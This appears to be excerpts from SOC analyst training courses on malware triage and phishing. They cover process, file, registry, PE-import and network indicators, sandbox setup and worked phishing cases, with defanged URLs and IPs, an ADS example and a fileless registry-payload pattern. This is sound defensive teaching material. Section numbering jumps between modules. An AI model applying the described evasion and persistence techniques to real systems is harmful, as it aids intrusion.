    When "good enough" isn't enough:

    • The hash comes back clean on VirusTotal (0 detections).
    • The sandbox shows minimal or no malicious behavior.
    • No known intelligence matches your IOCs.
    • The targeting or context suggests something beyond commodity malware.

  1. 4.1

    Process Analysis

    Why process analysis is your first move: processes tell a story in sequence (every process has a parent that created it); processes are hard to hide completely (even sophisticated malware that cleans up files / registry still had to run as a process at some point); process context reveals intent.

    Primary tools: EDR console (process-tree view, timeline, command-line capture), Process Explorer / Process Hacker (live endpoint analysis), Sysmon Event ID 1 (Process Creation — includes parent process, command line, hashes), Windows Security Event ID 4688 (Process Creation).

    Normal Windows process hierarchy: boot chain — System (PID 4) → smss.exe → csrss.exe + wininit.exe; wininit.exe → services.exe → all Windows services (svchost.exe instances); wininit.exe → lsass.exe (handles authentication). User-session chain — csrss.exe + winlogon.exe (per session); winlogon.exe → userinit.exe → explorer.exe; explorer.exe → user-launched applications.

    • Behavior checks: command-line arguments; is it making network connections, to where; what files has it created / modified / deleted; what registry keys has it touched; is it accessing other processes' memory (possible injection / credential dumping).

  2. 4.2

    File System Artifacts

    Why file system artifacts matter — 5 evidence categories: Evidence of delivery (the original malicious file may still exist), Evidence of execution (dropped payloads, extracted components, temp files), Evidence of persistence (files in startup locations, sideloaded DLLs, scripts referenced by scheduled tasks), Evidence of objectives (staged data files, screenshots, keylog outputs, exfiltration staging dirs), Evidence of cleanup (deleted files — potentially recoverable — and gaps in expected file patterns).

    Key data sources: EDR file creation / modification / deletion events, Sysmon Event IDs 11 (File Create) and 23 (File Delete), MFT (Master File Table) analysis for deeper forensics, manual file system inspection.

    High-priority suspicious locations: %TEMP% / %TMP%, %APPDATA%, C:\Users\Public\, C:\Windows\Temp\, C:\Users\<user>\Downloads\. What to look for: executables (.exe / .dll / .scr / .bat / .ps1) in any of these locations; files with mismatched extensions; files with names mimicking system components; recently created files correlating with the alert timeline; hidden files or files with system attributes set in user-writable directories.

    Dropped payloads and multi-stage files:

    • Stage 1 — initial dropper / loader (often an email attachment or download, typically found in Downloads / Outlook temp / browser cache, may be a document / archive / script).
    • Stage 2 — intermediate payload (downloaded / extracted by Stage 1, often a DLL / executable dropped to %TEMP% / %APPDATA% / a hidden subfolder, may be obfuscated / packed / encrypted on disk, filename may be random or mimic legitimate software).
    • Stage 3 — final payload (the actual malware — RAT, stealer, ransomware; may be injected into memory without touching disk; if on disk, often in a more permanent location; often accompanied by config files, DLLs, data files).

    Supporting files to look for: .bat / .ps1 scripts for execution / persistence setup, .txt / .dat files with encoded config or C2 addresses, .log files created by the malware, copied legitimate executables alongside malicious DLLs (sideloading packages).

    Alternate Data Streams (ADS): every NTFS file has a default data stream (visible content), but NTFS also supports named alternate streams attached to the same file — these don't appear in Explorer, don't change the file's reported size, and aren't shown by a basic dir command. Attackers abuse this by storing a malicious executable inside an alternate stream of an innocent-looking file — e.g. notepad.exe stored as C:\Users\Public\readme.txt:evil.exe — the file readme.txt appears normal (correct size / content) but carries a hidden executable. Malware can also store config data, stolen credentials, or encoded payloads in ADS. SOC relevance: less common than it once was but still appears in targeted attacks / some commodity malware; Sysmon Event ID 15 is your best automated detection; if doing manual inspection, always run dir /r or streams.exe on suspicious directories; note Zone.Identifier is a legitimate ADS tracking internet-downloaded files (Mark of the Web) — don't flag this as malicious.

    File Timestomping: the "MACE" attributes — Modified (content last changed), Accessed (last read), Changed (MFT metadata last changed), Entry Created / Birth (when originally created). How timestomping works: malware uses Windows API calls (SetFileTime) to overwrite M / A / C timestamps, setting them to match surrounding legitimate files (e.g., setting a 2025 malware file's timestamps to 2019); goal is to make the file invisible in timeline analysis sorted by creation / modification date. Compare $STANDARD_INFORMATION timestamps with $FILE_NAME timestamps — if the Created time in $STANDARD_INFORMATION is significantly earlier than in $FILE_NAME, the file has been timestomped. Practical SOC indicators (without MFT parsing): a file in %TEMP% with a creation date from years ago (temp files should be recent); an executable with timestamps matching core Windows files but no Microsoft digital signature; files with identical timestamps down to the second across multiple unrelated files (batch timestomping); a creation timestamp that predates OS installation.

    File system investigation checklist:

    • Discovery: check standard malware staging locations; sort by creation date to identify files that appeared during the suspected compromise window; look for executables / scripts / DLLs in locations they don't belong; search for filenames matching known malware families from your threat intel.
    • Examination: verify file types match extensions (file command or hex editor for magic bytes); hash every suspicious file and check reputation; check digital signatures — signed? by whom? valid?; note file sizes (unusually small executables <50 KB may be downloaders; unusually large ones may be packed or contain embedded payloads).
    • Context: what process created / modified the file (EDR file-creation events); does the timestamp make sense for its location; are there related files nearby; check for ADS on suspicious files / directories.
    • Preservation: record full file paths / hashes / sizes / timestamps before any containment action; if possible, collect a copy for sandbox analysis or escalation; document everything (files may be quarantined / deleted / overwritten during remediation).
  3. 4.3

    Registry Artifacts

    Why malware interacts with the registry:

    • Persistence — dozens of registry locations cause programs to run automatically at boot / logon.
    • Configuration storage — encrypted C2 addresses, encryption keys, or operational parameters (stealthier than config files on disk).
    • Defense evasion — registry modifications can disable security features, hide from tools, alter system behavior.
    • Credential access — some registry locations contain cached credentials or security policy data.

    Key data sources for registry monitoring: EDR registry modification events; Sysmon Event ID 12 (Registry Key / Value Create / Delete), 13 (Registry Value Set), 14 (Registry Key / Value Rename); Windows Security Event ID 4657 (requires auditing enabled); Autoruns (Sysinternals) for a comprehensive view of all autostart registry entries.

    Registry keys for security evasion — malware modifies keys to weaken security controls: Disabling Windows Defender, Disabling UAC, Modifying PowerShell execution policy, Hiding files from Explorer, Disabling Task Manager. SOC relevance: any modification to security-related keys during a suspected compromise window is a strong behavioral indicator; your EDR should alert on many of these, but knowing the specific keys helps you hunt for evasion that might not trigger a rule.

    Registry as configuration storage — what malware stores there: encrypted / encoded C2 server addresses, encryption keys for payload decryption, bot configuration parameters (sleep intervals, campaign IDs), stolen credentials or session tokens, encoded payloads (the malware itself can be stored entirely in a registry value). Why the registry is attractive: no file on disk to scan (registry values aren't inspected by traditional file-based AV), persists across reboots, can hold large amounts of binary data, less conspicuous than files in monitored directories. Common storage locations: custom subkeys under HKCU\Software\ with names mimicking legitimate software, values with large binary data (REG_BINARY) in unexpected locations, Base64-encoded strings stored as REG_SZ values.

    Real-world example pattern: loader executes and downloads an encrypted payload → loader writes the encrypted payload as a REG_BINARY value under HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\{random GUID} → a persistence mechanism (scheduled task) runs a PowerShell command that reads the registry value, decrypts it in memory, and executes it → result: persistence + payload storage with no malicious file on disk.

    Registry investigation checklist:

    • Autostart inspection: run Autoruns; check all Run / RunOnce keys in both HKCU and HKLM; inspect Winlogon Shell and Userinit values; review services for recently created / modified entries; check IFEO keys for unexpected Debugger values.
    • Security modification inspection: check Windows Defender policy keys for disabling entries; verify firewall / UAC settings haven't been modified; check PowerShell execution policy; look for Task Manager or Registry Editor disabling policies.
    • Timeline correlation: filter EDR / Sysmon registry events to the suspected compromise window; identify which process made each registry modification; correlate registry changes with process-creation events to build the attack sequence.
    • Data storage inspection: look for newly created keys with names that don't match installed software; identify unusually large REG_BINARY values; check for Base64 / hex-encoded strings in unexpected locations; if a persistence command references a registry path, inspect the value at that path.

Network-Based Indicators

  1. 5.1

    Why Network Indicators Matter

    C2 communication is the lifeline of an active infection; network data covers your entire environment; some malware is almost invisible on the host; exfiltration is a network event; lateral movement crosses the network.

    Primary data sources: firewall logs (allow / deny events, source / destination IPs and ports), web proxy logs (HTTP / HTTPS URLs, user-agents, content types, response sizes), DNS logs (query names, response types, query volume), IDS / IPS alerts (signature-based detection), EDR network telemetry (per-process network connections on the endpoint), NetFlow / traffic metadata (connection volume, duration, byte counts), packet capture PCAP (complete traffic content when available).

  2. 5.2

    C2 Communication

    C2 communication phases:

    • Tasking — attacker sends commands (run this program, steal these files, move to this host).
    • Results — malware sends back output (command results, stolen data, screenshots, keylog captures).
    • Updates — attacker pushes new modules, config changes, or entirely new payloads.
    • Heartbeat / beacon — malware periodically checks in ("I'm still alive and ready for instructions").

    C2 Architecture Models:

    Beaconing: malware sends a small periodic request; no instructions → server responds with "sleep" or empty; instructions available → server responds accordingly; the cycle repeats at a configured interval.

  2. 6.2

    PE File Analysis

    PE files include: .exe (executables), .dll (dynamic link libraries), .sys (kernel drivers), .scr (screensavers — functionally identical to .exe), .ocx (ActiveX controls), .cpl (Control Panel applets).

    PE structure overview:

    • DOS Header (first 64 bytes) — starts with MZ magic bytes; SOC relevance: if you see MZ at the start of any file, it's a PE.
    • COFF / File Header — TimeDateStamp: when the file was compiled.
    • Sections — .text (executable code), .data (initialized global data), .rdata (read-only data — often imports / strings / constants), .rsrc (resources — icons, version info, embedded files, dialog boxes), .reloc (relocation data); additional sections may be added by packers, protectors, or the compiler.

    PE Timestamps: recent timestamp matching the incident timeline → malware possibly built specifically for this campaign; timestamp from years ago on a recently discovered sample → either legitimate old software or a forged timestamp (timestomping); timestamp in the future → timestomped; timestamp of January 1, 1970 (epoch zero) → deliberately zeroed out by the developer / build tool; timestamps consistently during specific working hours across multiple samples → can suggest the developer's timezone and working patterns. Tools: PEStudio (shows compile timestamp and flags anomalies), PE-bear (displays all PE-structure timestamps), CFF Explorer (detailed header inspection). SOC action: note the compile timestamp for every PE file you analyze and compare it against the incident timeline — a file compiled minutes before it appeared on your network tells a different story than one compiled two years ago.

    PE Imports — how they work: Windows applications don't include code for system operations (file access, network communication, process management) — they call functions from Windows DLLs. The import table declares "I need function X from DLL Y"; the Windows loader resolves these when the program runs.

    What the import table reveals about capabilities:

    • File operations (reading / writing / deleting files) — kernel32.dll: CreateFileA/W, WriteFile, ReadFile, DeleteFileA/W, CopyFileA/W.
    • Registry operations (persistence, config) — advapi32.dll: RegOpenKeyExA/W, RegSetValueExA/W, RegCreateKeyExA/W, RegDeleteKeyA/W.
    • Network communication (C2, downloading) — wininet.dll: InternetOpenA/W, InternetOpenUrlA/W, HttpSendRequestA/W.
    • Process manipulation (injection, execution) — kernel32.dll: CreateProcessA/W, OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread.
    • Cryptography (ransomware, encrypted C2) — advapi32.dll: CryptEncrypt, CryptDecrypt, CryptGenKey, CryptAcquireContextA/W; bcrypt.dll: BCryptEncrypt, BCryptDecrypt.
    • Screen / keyboard capture (spyware) — user32.dll: GetAsyncKeyState, SetWindowsHookExA/W, GetDC, BitBlt.

    Suspicious import combinations:

    • Process injection pattern: OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
    • Download and execute pattern: InternetOpenA + InternetOpenUrlA + CreateFileA + WriteFile + CreateProcessA.
    • Ransomware pattern: FindFirstFileA + FindNextFileA + CryptAcquireContextA + CryptGenKey + CryptEncrypt + DeleteFileA.
    • Anti-analysis / evasion pattern: IsDebuggerPresent + CheckRemoteDebuggerPresent + GetTickCount + Sleep.

    PEStudio workflow (5 minutes for comprehensive PE triage): open the suspicious file in PEStudio → check the Indicators tab (read every flagged item) → check VirusTotal results → review flagged strings (extract network IOCs) → review flagged imports (assess capabilities) → check sections for entropy anomalies → note compile timestamp and any version / debug information → document findings.

    Reading the import table when it's minimal — dynamically resolved imports: a malware sample with only LoadLibrary and GetProcAddress in its import table reveals nothing about its capabilities through static import analysis — during execution it resolves hundreds of API functions, observable only dynamically.

  3. 6.3

    Dynamic Analysis Foundations

    What you observe during dynamic analysis: processes created and commands executed; files written / modified / deleted; registry keys created / changed; network connections attempted (DNS queries, HTTP requests, raw socket connections); system services installed / modified; UI changes (ransom notes, pop-ups, wallpaper changes); interactions with other processes (injection, credential access).

    Why dynamic analysis is necessary:

    • Packed and obfuscated malware.
    • Dynamically resolved imports — a sample with only LoadLibrary / GetProcAddress reveals nothing through import analysis; during execution it resolves hundreds of functions you can observe.
    • Encrypted configurations — C2 addresses / encryption keys / campaign parameters stored as encrypted blobs become readable only when the malware decrypts them at runtime.
    • Conditional behavior — some malware behaves differently depending on the environment (domain membership, specific usernames, geography, time of day).
    • Multi-stage payloads — static analysis of a loader reveals its download capability; dynamic analysis reveals what it actually downloads, from where, and what that second-stage payload does.
    • Behavioral sequencing — static analysis might tell you the malware can create files and modify the registry; dynamic analysis tells you the order: it first creates C:\ProgramData\update.dll, then adds a Run key pointing to rundll32.exe update.dll,Start, then connects to 185.234.72[.]19 over HTTPS (the sequence matters for understanding the attack chain and building detection rules).

    Static vs. Dynamic:

    DimensionStatic AnalysisDynamic Analysis
    What you examineThe file at restBehavior during execution
    SpeedFast (minutes)Slower (minutes to hours, depending on observation period)
    SafetySafe — file is never executedInherently risky, requires isolated environment
    Packed / encrypted samplesLimited (sees the wrapper, not the payload)Effective — packer unpacks during execution
    IOC extractionStrings, imports, embedded indicatorsNetwork traffic, dropped files, registry changes, full C2 communication
    CompletenessMay miss runtime-only behaviorsMay miss conditional branches not triggered in the lab

    When to use dynamic analysis: static analysis reveals the file is packed / heavily obfuscated and you can't extract meaningful IOCs; you need to understand the full behavior chain (not just what it could do); the sample appears to be a loader / dropper (need to discover what it downloads / extracts); you're building a detailed incident report and need documented observed behaviors, not theoretical capabilities; you need network IOCs (C2 addresses, download URLs) not visible in static analysis.

    When dynamic analysis is NOT necessary: hash lookups confirm well-documented commodity malware; static analysis fully characterizes the sample (clear strings, known imports, complete IOC extraction); the file is confirmed benign through reputation / signature verification / context; time constraints require immediate containment; the sample is a script / document you can fully read and understand through static review.

    The risks of dynamic analysis: (1) malware escapes the analysis environment; (2) malware contacts real C2 infrastructure; (3) malware causes real damage within the analysis environment; (4) legal and compliance considerations; (5) malware detects the analysis environment.

    Rules of dynamic analysis:

    1. Rule 1 — NEVER execute malware on a production system or your daily-use workstation.

    2. Rule 2 — NEVER connect the analysis VM directly to your production network.

    3. Rule 3 — ALWAYS take a snapshot before execution.

    4. Rule 4 — ALWAYS monitor before, during, and after execution.

    5. Rule 5 — ALWAYS know what you're running before you run it.

    6. Rule 6 — ALWAYS preserve your evidence before reverting.

    Analysis environment architecture:

    • Analysis VM — where the malware runs (Windows 10 / 11 with analysis tools pre-installed); this is the VM you snapshot before execution.
    • Services VM — simulates the network services the malware expects to find (DNS, HTTP, HTTPS, SMTP); captures all traffic the malware generates; typically a Linux VM running INetSim or FakeNet-NG.
    • Isolated network — a virtual network (host-only or internal-only) connecting only the Analysis VM and Services VM, with no route to the host's real network adapter or the internet.

    Hardening the Analysis VM: disable Windows Defender, SmartScreen, Windows Firewall, UAC, automatic sample submission, and Tamper Protection. Make the environment look "real": create a user profile with a realistic name (not "Analyst" or "Malware Lab"); install common applications (browser, Office, Adobe Reader); place some innocuous documents on the Desktop and in Documents; create browser history and bookmarks; set a realistic wallpaper; install a few programs in Program Files so it isn't nearly empty; set the timezone / locale to match your target investigation context.

    Services VM (REMnux provides): pre-installed network simulation tools (INetSim, FakeNet-NG), network capture tools (Wireshark, tcpdump), analysis tools for examining captured traffic / extracted payloads, DNS / HTTP / SMTP simulation capabilities.

    Network simulation limitations: responses don't match real C2 server responses; SSL / TLS certificate mismatches; multi-stage payloads may not fully execute; some malware validates connectivity before proceeding. In some cases, allowing the analysis VM controlled access to the real internet produces better results than simulated services — but for SOC Level 1 / 2 analysts, use network simulation by default.

    Pre-Flight Checklist:

    • Environment verification: Analysis VM connected to host-only / isolated network only; Analysis VM has NO internet access (verified by ping test); Analysis VM cannot reach the host machine; Windows Defender fully disabled; Windows Firewall disabled; shared folders disabled or will be before execution; Services VM (REMnux) running and INetSim / FakeNet-NG active; DNS resolution from the Analysis VM points to the Services VM (verified with nslookup).
    • Sample preparation: sample hashed (MD5 / SHA-1 / SHA-256) and recorded; static analysis performed (you have a hypothesis about what it does); sample transferred to the Analysis VM; transfer mechanism disconnected (shared folder disabled, virtual media unmounted).
    • Monitoring readiness: Process Monitor running and capturing; Wireshark / tcpdump capturing on the Services VM; Regshot has taken a "before" snapshot of the registry; Autoruns baseline recorded (optional); INetSim / FakeNet-NG logs are fresh (cleared from previous sessions).
    • Safety: clean snapshot has been taken — this is the most critical step; you know what sample you're running and have documented the session start time; you have a plan for evidence preservation after the session. Ready to execute: double-click the sample and begin observation.

    Course closing — Key concepts recap: Malware fundamentals; Static analysis; Dynamic Analysis. Phishing Fundamentals

  1. 1.1

    What Is Phishing? + Why It Matters in the SOC

    Phishing: exploits human trust, not technical vulnerabilities; delivered primarily via email, but also SMS, voice, messaging platforms, and QR codes; can be mass-distributed (spray) or highly targeted (spear phishing); often serves as the first step in a larger attack chain — ransomware, data exfiltration, BEC fraud, and network compromise frequently begin with a single phishing email.

    Why phishing matters in the SOC: it's the most frequently reported alert type in most SOC environments; it's the #1 initial access vector across virtually every industry vertical; a single successful phish can lead to credential theft, malware deployment, lateral movement, or full domain compromise; SOC analysts are often the last line of defense (user-reported phishing emails land on your desk before anywhere else); speed matters — the time between delivery and first click is often measured in minutes, not hours.

    How phishing has evolved:

    • 2000s — Mass Email Campaigns.
    • 2010s — Targeted and Sophisticated.
    • 2020s — Modern Phishing (AiTM kits, multi-channel, MFA-aware).
  2. 1.2

    The Business Impact

    Financial:

    • Direct costs: fraudulent wire transfers and BEC losses (FBI IC3 reported over $2.9 billion in BEC losses in 2023 alone), ransomware payments triggered by phishing-delivered malware, regulatory fines for phishing-originated data breaches.
    • Indirect costs: incident response and forensic investigation expenses, legal fees and breach notification costs, increased cyber insurance premiums, lost productivity during containment and remediation.

    Reputational: loss of customer trust following a publicized breach; negative media coverage and brand damage; partner and vendor confidence erosion (especially in supply-chain scenarios); long-term customer attrition persisting well beyond the incident.

    Operational: business disruption during containment (email quarantines, account lockouts, system isolation); diversion of IT / security resources from planned projects; potential loss of access to critical systems if credentials are compromised at scale; downstream effects when phishing leads to ransomware (entire business operations may halt).

  3. 1.3

    Phishing and MITRE ATT&CK T1566

    T1566: Phishing — three sub-techniques:

    • T1566.001 Spearphishing Attachment — malicious files delivered as email attachments (Office docs, PDFs, archives, HTML files).
    • T1566.002 Spearphishing Link — malicious URLs embedded in the email body directing victims to credential-harvesting pages, exploit kits, or malware downloads.
    • T1566.003 Spearphishing via Service — phishing delivered through third-party services such as social media platforms, messaging apps, or collaboration tools (Teams, Slack).

    Why phishing dominates initial access:

    • Low cost, high reward — sending thousands of emails costs virtually nothing; one successful compromise can yield massive returns.
    • Scalable — a single campaign can target hundreds or thousands of employees.
    • Bypasses perimeter defenses — targets people, not firewalls; passes through the front door via legitimate email infrastructure.
    • Difficult to eliminate entirely — no technical control can reduce human susceptibility to zero.
    • Versatile — can deliver credential theft, malware, BEC fraud, or reconnaissance, often serving multiple objectives in one campaign.
    • Constantly evolving — attackers rapidly adapt to bypass new defenses (e.g., AiTM kits emerged specifically to defeat MFA).
  4. 1.4

    The SOC Analyst's Role in Phishing Defense

    Detection & Triage: reviewing alerts from email security gateways (SEG), SIEM, and user-reported phishing queues; making initial severity / legitimacy assessments; prioritizing phishing alerts relative to other SOC workload.

    Analysis & Investigation: performing header, content, URL, and attachment analysis; extracting and enriching IoCs; determining scope (how many users received or interacted with the phish?).

    Response & Remediation: quarantining or clawing back malicious emails from mailboxes; initiating credential resets and session invalidation; coordinating with IT for endpoint containment when payloads were executed.

    Documentation & Escalation: writing clear, actionable phishing tickets; escalating complex cases to L2 / L3 or the incident response team; feeding IoCs and findings into threat intelligence workflows.

02

Types of Phishing Attacks

  1. 2.1

    The Phishing Taxonomy

    Targeting: Untargeted (mass / spray) vs. Targeted (spear phishing, whaling, BEC).

    Delivery channel: Email (the dominant channel); SMS (smishing), voice calls (vishing), QR codes (quishing); third-party platforms (Teams, Slack, social media, collaboration tools).

    Objective: Credential harvesting (login pages, OAuth consent); malware delivery (attachments, drive-by downloads); financial fraud (wire transfers, invoice manipulation); reconnaissance / initial access for follow-on attacks.

  2. 2.2

    Mass Phishing / Spray Campaigns

    How it works: generic content, no personalization; impersonates widely used services (M365, Google, Amazon, banks, shipping carriers); urgency-driven pretexts (account suspension, failed delivery, unauthorized login); typically directs victims to credential-harvesting pages cloning legitimate login portals; disposable infrastructure (newly registered domains, compromised sites, free hosting); frequently grammatical errors, inconsistent branding, mismatched sender domains.

    What SOC analysts see: multiple users across the org reporting the same / similar emails; email gateway alerts showing a burst of blocked messages with common indicators; low sophistication but high volume (the most common phishing alerts in most SOCs).

    Worked case — Mass Microsoft 365 Credential Harvesting

    • A SOC receives 47 user-reported phishing emails within a two-hour window, all near-identical, claiming the recipient's M365 password is expiring and directing them to a "verification portal."
    • Sender: no-reply@microsft-security-alert[.]com (typosquatting).
    • Reply-To differs from the From address.
    • URL: hxxps://login-microsoftonline[.]redirectservice[.]xyz/auth — a non-Microsoft domain hosting a cloned O365 login page.
    • SPF and DKIM both fail.
    • The HTML source contains a hidden field pre-populating the victim's email address from a URL parameter.
  3. 2.3

    Spear Phishing

    How it works: highly personalized content referencing specific projects, colleagues, or events; sender often impersonates someone the target knows (manager, vendor, partner, IT contact); believable, context-aware pretexts ("Here's the updated contract from our meeting Tuesday"); more sophisticated payloads (weaponized documents, targeted credential pages, tailored malware); lower volume makes these harder for gateways to detect via reputation-based filtering; attackers invest in OSINT (LinkedIn, company websites, social media, press releases, conference agendas).

    What SOC analysts see: single-user or small-cluster reports that don't match any known mass campaign; higher-quality lures that may have bypassed email security controls entirely; potential connection to APT activity or targeted intrusion campaigns; these require deeper investigation — the attacker already knows something about your organization.

    Worked case — Targeted Contractor Impersonation

    • A project manager in engineering receives an email from what appears to be an external contractor they've worked with on a software integration project, referencing the correct project name and milestone date, with a "revised statement of work" Word attachment.
    • Sender domain: contractorname-consulting[.]com (legitimate contractor's domain is contractorname[.]com — an extra word added).
    • The attachment is a .docm (macro-enabled Word document).
    • Macro analysis reveals a PowerShell download cradle connecting to a C2 server.
    • Sent outside the contractor's normal business hours.
    • The referenced project details were available on the company's public project blog (OSINT source).
  4. 2.4

    Whaling

    How it works: targets C-suite executives (CEO, CFO, CTO), board members, legal counsel, senior directors; pretexts exploit executive-level scenarios (board resolutions, M&A documents, legal subpoenas, regulatory inquiries, confidential HR matters); impersonation may come from external parties (law firms, regulatory bodies, auditors, banking contacts); formal, professional tone matching executive communication norms; may bypass the security team entirely (executives sometimes operate outside standard filtering policies or use personal devices).

    What SOC analysts see: reports from executive assistants or the executives themselves (though executives may be less likely to report); emails referencing highly sensitive business topics (handle with appropriate confidentiality); potential overlap with BEC if financial authorization requests are involved; escalation may be necessary due to the sensitivity of the target and data involved.

    Worked case — Fake Legal Subpoena Targeting CFO

    • The CFO receives an email appearing to come from a well-known law firm, claiming to contain a court subpoena related to a regulatory matter, addressed personally, referencing the correct legal entity name, and using the firm's actual email signature format.
    • Sender domain: smithanderson-legal[.]com (the legitimate firm's domain is smithandersonlaw[.]com).
    • The PDF contains an embedded JavaScript action redirecting to a credential-harvesting page impersonating Microsoft's OAuth consent flow.
    • The sending IP doesn't match the law firm's mail server.
    • DMARC result: none (the spoofed domain had no DMARC record published).
    • The "subpoena" references a case number that doesn't match any known legal proceeding.
  5. 2.5

    Business Email Compromise (BEC)

    How it works: a category of phishing focused on financial fraud, where the attacker impersonates or compromises a trusted business contact to manipulate victims into transferring money, redirecting payments, or disclosing sensitive financial information — distinguished by its reliance on trust and authority rather than technical payloads. Often involves no malicious link or attachment at all — the email itself is the weapon.

    Two primary variants:

    • Impersonation-based BEC — spoofed / lookalike domains.
    • Compromise-based BEC — attacker controls a legitimate mailbox.

    Common scenarios: wire transfer requests from a "CEO," invoice payment redirection from a "vendor," payroll direct-deposit changes from an "employee," gift-card purchase requests. Highly effective because it exploits established business workflows and trust relationships; financial losses per incident can be enormous.

    What SOC analysts see: finance or HR team members reporting unusual payment / payroll-change requests; emails with subtle domain discrepancies or display-name spoofing; mailbox compromise detected via impossible travel, mail-forwarding rule changes, or unusual sent items; these alerts often require coordination with finance, legal, and executive leadership.

    Worked case — Vendor Invoice Redirection

    • Accounts payable receives an email from what appears to be a long-standing construction vendor, stating the vendor has changed banks and providing new wire transfer details for an upcoming, already-expected $340,000 payment.
    • The sender's email address matches the vendor's real domain (the vendor's actual mailbox was compromised).
    • The email thread is a continuation of a legitimate prior conversation (thread hijacking via a compromised account).
    • The new banking details point to an account at a different financial institution than previously used.
    • No malicious links or attachments present (the email body is the entire attack).
    • A subtle mail-forwarding rule was found in the vendor's mailbox, silently copying all incoming mail to an external address.
  6. 2.6

    Vishing (Voice Phishing)

    How it works: attacker impersonates IT support, help desk, bank fraud departments, government agencies, or vendors; caller ID spoofing makes calls appear to originate from legitimate numbers; real-time social engineering is more persuasive than email (the attacker adapts their pretext on the fly); common objectives: harvesting credentials or MFA codes, tricking victims into installing remote-access tools (AnyDesk, TeamViewer), extracting sensitive data verbally; sometimes combined with prior reconnaissance or used as a follow-up to an email-based lure.

    What SOC analysts see: user reports of suspicious phone calls requesting credentials or remote access; EDR alerts showing unauthorized remote-access tool installations following a reported call; MFA push-notification approvals the user didn't initiate (the vishing attacker requested the code in real time); these incidents may not generate traditional email-based IoCs — document the caller ID, time, and social-engineering narrative.

    Worked case — IT Help Desk Impersonation via Vishing

    • A marketing employee receives a call from someone claiming to be from IT support, stating there's a critical security issue with the employee's account, and walks them through "resolving" it — navigating to a URL, entering credentials, and approving an MFA push notification.
    • The caller ID displayed the company's legitimate IT support number (spoofed).
    • The employee was directed to a URL on a recently registered domain hosting a credential-harvesting page.
    • The attacker used the stolen credentials and approved the MFA push in real time to establish a session.
    • Azure AD sign-in logs showed a login from a VPN exit node in a foreign country within seconds of the MFA approval.
    • No phishing email preceded this attack — it was a pure vishing engagement.
  7. 2.7

    Smishing (SMS Phishing)

    How it works: phishing delivered via SMS or text messaging, exploiting the trust people place in text messages (SMS feels more personal and urgent than email).

    Common pretexts: package delivery notifications, bank fraud alerts, toll / road unpaid fines, MFA verification codes, tax refund notices.

    URLs often shortened (bit.ly, t.co) or use mobile-friendly deceptive domains; messages are brief and action-oriented (designed to trigger an immediate tap); mobile devices display limited URL information, making domain verification harder for users; increasingly used to target corporate credentials, especially employees who access work email on personal phones.

    What SOC analysts see: user reports of suspicious texts, sometimes forwarded as screenshots; smishing may not generate alerts in the email security stack (detection depends on user awareness and endpoint telemetry); credential compromise from smishing may first appear as an anomalous login event; IoCs are primarily domains and phone numbers (document both).

    Worked case — Fake Package Delivery Smishing

    • Multiple employees report texts claiming to be from a major shipping carrier, requiring address confirmation for a delivery; the link first asks for the shipping address, then a credit card number for a "small redelivery fee," then finally prompts for M365 credentials to "verify identity."
    • Sending phone numbers rotate across multiple numbers with no consistent pattern.
    • The URL uses a shortened link redirecting through two intermediary domains before reaching the harvesting page.
    • The final domain was registered 48 hours before the campaign began.
    • The credential-harvesting page closely mimics the M365 login page but is hosted on infrastructure unrelated to Microsoft.
    • Several employees received the same message within a 30-minute window, suggesting a targeted campaign using a company phone-number list.
  8. 2.8

    Quishing (QR Code Phishing)

    How it works: phishing that uses QR codes to deliver malicious URLs — embedded in an email, document, physical printout, or even placed in physical locations. When scanned, it directs the victim's mobile device to a credential-harvesting page or malware download.

    QR codes bypass traditional email link scanning (most email security gateways cannot read or analyze URLs embedded in QR code images); forces interaction onto mobile devices, which typically have weaker security controls and less URL visibility.

    Common pretexts: MFA setup instructions, document access verification, parking payment portals, WiFi login portals, corporate policy acknowledgment forms; can be delivered digitally (email, PDF, shared document) or physically (printed flyers, posters, business cards, stickers placed over legitimate QR codes); the URL is invisible to the user until after scanning.

    What SOC analysts see: user-reported phishing emails where the body contains a QR code image instead of a traditional hyperlink; mobile-device-originated credential compromise that doesn't match any email-based phishing campaign; alerts from mobile device management (MDM) or conditional access policies triggered by suspicious mobile logins.

    Worked case — Fake MFA Enrollment QR Code

    • Employees across multiple departments receive an email appearing to come from the IT security team, stating the company is migrating to a new MFA provider and instructing employees to scan the attached QR code with their phone — includes the correct company logo, IT team signature block, and references a real upcoming security initiative.
    • The sender address uses a lookalike domain: itsecurity@company-corp[.]com instead of itsecurity@company[.]com.
    • The QR code resolves to a URL on a recently registered domain hosting an AiTM proxy page mimicking the company's Azure AD login.
    • The email contains no clickable hyperlinks (the QR code is the only call to action, rendering URL-based email scanning ineffective).
    • Image analysis of the QR code (decoded offline) reveals the embedded URL before scanning.
    • SPF passes because the attacker used their own domain, but DMARC fails on alignment.
03

The Phishing Kill Chain

  1. 3.1

    Why Map Phishing to a Kill Chain

    The kill-chain framework helps SOC analysts in three practical ways:

    • Structured analysis — instead of examining a phishing email in isolation, you trace the attack forward and backward, giving your investigation direction and depth.
    • Detection opportunities — every stage generates artifacts.
    • Prioritized response — knowing where you are in the kill chain tells you what's at stake.

    The original Cyber Kill Chain:

    1. Reconnaissance

      Researching / identifying the target.

    2. Weaponization

      Creating the malicious payload / delivery vehicle.

    3. Delivery

      Transmitting the weapon.

    4. Exploitation

      Triggering the malicious action.

    5. Installation

      Establishing persistence.

    6. Command & Control

      Opening a channel to the attacker.

    7. Actions on Objectives

      Accomplishing the attacker's ultimate goal.

    The Phishing Kill Chain applies the same 7 stages specifically to phishing: Reconnaissance (harvesting emails, researching org structure) → Weaponization (building the phishing email, creating the payload or harvesting page) → Delivery (sending the phishing email) → Exploitation (victim clicks the link, submits credentials, or opens a malicious attachment) → Installation (malware installs) → Command & Control (compromised system beacons to attacker) → Actions on Objectives (data exfiltration, lateral movement, ransomware, BEC fraud).

  2. 3.2

    Stage 1 — Reconnaissance

    Target identification: harvesting employee email addresses from corporate websites, LinkedIn, GitHub, conference speaker lists, data breach dumps, and Hunter.io-style tools; mapping the organizational hierarchy (identifying executives, finance staff, IT administrators, and other high-value targets); identifying vendors, partners, and third-party relationships that can be impersonated.

    Organizational intelligence: studying the company's email format conventions; reviewing recent press releases, job postings, and social media for topical pretexts (mergers, new hires, technology migrations); identifying the company's email security stack (from job postings requesting specific product experience, or MX record analysis) to craft payloads that evade specific controls.

